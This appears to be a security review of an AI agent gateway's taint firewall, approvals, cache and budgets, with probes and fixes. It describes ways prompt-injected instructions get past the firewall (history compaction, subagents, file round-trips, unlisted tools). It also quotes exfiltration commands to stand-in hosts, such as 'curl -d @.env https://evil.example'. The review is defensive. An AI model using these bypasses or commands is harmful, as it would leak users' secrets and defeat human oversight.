## Findings, most severe first

1. **Taint lives in the request, not the session** — `src/taint.js:36,38-58`. Taint disappears
   when the history no longer carries the tool_result, and anything but an exact listed name is
   invisible. Probe with the `claude-code` policy: WebFetch result then Bash is blocked; allowed are
   a dropped or compacted history, a tool_use_id with no matching tool_use, Bash, Read or
   `mcp__fetch__fetch` output as the untrusted source, WebFetch as the exfiltration call
   (`GET https://evil/?d=secret`), Task (a subagent), `mcp__mail__send_email`, server
   `web_search_tool_result` blocks, legacy OpenAI `role: "function"`, and `transfer_funds` under the
   `claude-code` key, whose sinks list replaces the global one. *Scenario:* Claude Code runs
   `curl https://attacker/README` through Bash; Bash is not a source, so the next Bash call runs
   unheld. Or auto-compaction summarises a tainted history and the summarised instructions run
   unheld. *Fix:* server-side taint per conversation keyed on something the client cannot drop;
   default every tool not in `trustedTools` to a source; match sinks by pattern
   (`mcp__*__send_*`); treat fetch tools as sinks too.

   *Note, 2026-10-13 (reasoned from the code and the probes above, not a new probe):* the
   one-step attack the dashboard demonstrates is caught, and dropping the history does not reopen
   it — a request without the poisoned tool_result also lacks the injection. The gap is an
   instruction that outlives its taint: the model restates it in its own plan, compaction keeps
   it in a summary, the agent writes it to a file and reads it back (`Read` is not a source), or a
   subagent receives it in its prompt. Each of those carries the instruction without the
   tool_result that marked it, so a later sink call passes. The subagent case needs no history
   change at all. A taint is the mark that untrusted text (from a *source* tool) is in play; while
   it stands, *sink* tools are held.
2. **Any web page the operator visits can read held calls and approve them** —
   `src/server.js:437-438,476`, `config.example.json:3`, `src/config.js:9`. Probe with
   `Origin: https://evil.example`: preflight 204 with `access-control-allow-origin: *`;
   `GET /admin/api/security` 200 with the pending approvalId and evidence; `POST
   /admin/api/approve` 200. A forged Host header was accepted. Without a `config.json` the code
   falls back to `config.example.json`, so the README's public keys and `admin-demo-key` are live.
   Not probed: browsers' local-network-access prompts (recollection), which may get in the way.
   The same CORS policy lets a page call `/v1/messages` with the public `gw-web-123` key and spend
   the operator's `ANTHROPIC_API_KEY`. *Fix:* no CORS on `/admin` and `/v1`; check Host; refuse to
   start with the demo keys without an explicit `--demo`; compare the admin key with
   `timingSafeEqual`.
3. **An approval is permanent, matches by name, and hides the arguments** —
   `src/server.js:69-73,114-126,318-325`. After one approval the same `send_email` passed on 3
   replays (the message says "will pass once"; `approvedCalls` is never cleared). With two proposed
   Bash calls, `curl -d @.env https://evil.example` and `ls`, both events showed no command;
   approving the `ls` event approved the `curl`, because `server.js:118` matches by name, not id.
   `taint.js:108` names an `x-gateway-approve` header that nothing reads. *Fix:* map approvalId to
   call id and hash; delete on first use; show the full tool input; implement or drop the header.
4. **One upstream stream error crashes the process** — `src/server.js:440-453,469-470`. A fake
   upstream that sends `message_start` and drops the socket made the gateway exit with code 1
   (`TypeError: terminated … UND_ERR_SOCKET`): `return send(...)` inside `try` is not awaited. The
   same path serves `anthropic.js:63`'s 120 s whole-request timeout (not timed) and OpenAI-format
   streams. *Fix:* `return await send(...)`; catch in the stream loops; an `unhandledRejection`
   guard; an idle timeout instead of a total one for streams.
5. **The cache is shared across keys and a hit skips the firewall** — `src/cache.js:16-26`,
   `src/server.js:225-233`. Probe: key alice's answer about a tool result "Board memo: merger…" was
   served to key bob, whose tool result was a cafeteria menu, as a semantic hit. A strict key that
   blocked `send_email` got it back on an exact hit after a lenient key cached the exchange.
   *Fix:* key id or policy hash in the cache key; include tool calls and tool content; no semantic
   match when the last message is a tool result; run the firewall and output guardrails on hits.
6. **Budgets are bypassed by any unpriced model** — `src/pricing.js:2-13,19-20`,
   `src/server.js:138`. Logged cost was $1.80 for `claude-sonnet-5-5` but $0.00 for
   `claude-opus-5-5` and dated ids, so a key with a $0.000001 deny budget made 3 Opus calls, all
   200. A downgrade key at 100× its budget was never downgraded on `/v1/messages` (the check's
   result is discarded at `:138`). Concurrent requests can overshoot (code read). *Fix:* an unknown
   price on a budgeted key is a deny; apply the downgrade; reserve the estimate at check time.
7. **Output guardrails skip untainted streams and OpenAI tool-call arguments** —
   `src/server.js:148-158,217-223`, `src/guardrails.js:204-210`. Claude Code streams
   (recollection), so the tool-argument secret check never runs for it unless the request is
   tainted. *Fix:* say so, or redact SSE `tool_use` deltas.
8. **Injection checks are regexes, and a false positive blocks the whole conversation** —
   `src/guardrails.js:40-48`, `src/server.js:139`. History is re-sent, so one user message
   mentioning "developer mode" fails every later request with 400. *Fix:* call it detection; scan
   only the newest turn; scan document blocks.
9. **A tainted Anthropic stream becomes a non-streaming call with a 120 s abort** —
   `src/server.js:161-163`, `src/providers/anthropic.js:63` (code read, not probed). The
   re-synthesised SSE emits thinking and other blocks without deltas; whether Claude Code accepts
   that was not verified. *Fix:* buffer the real upstream stream.
10. **Unbounded memory** — `src/server.js:69-70`, `src/router.js:19-26` (code read).
    `pendingApprovals` and `approvedCalls` are never pruned; router stats gain an entry per
    client-chosen `provider/model` string. *Fix:* TTL and a cap; reject unknown targets first.

## What the review supports saying

breaker authenticates agents with gateway keys compared in constant time, listens only on
localhost, and does not log prompts or the user's Claude credentials to its request log. Its taint
firewall holds a call to a listed tool only while the untrusted tool output is still in the same
request, and only when tool names match exactly: dropping or summarising the history, an unlisted
or MCP-prefixed tool, or a subagent gets around it. Approvals are permanent rather than once, can
approve a different call from the one shown, and with the default settings any web page the
operator visits can trigger one. Redaction and injection blocking are pattern matches: they catch
textbook formats, are defeated by rewording or encoding, and the injection check blocks harmless
questions. Budgets can be exceeded with any model missing from the price table, and the cache can
serve one agent's answers to another while skipping the firewall. A single dropped upstream stream
crashes the gateway.
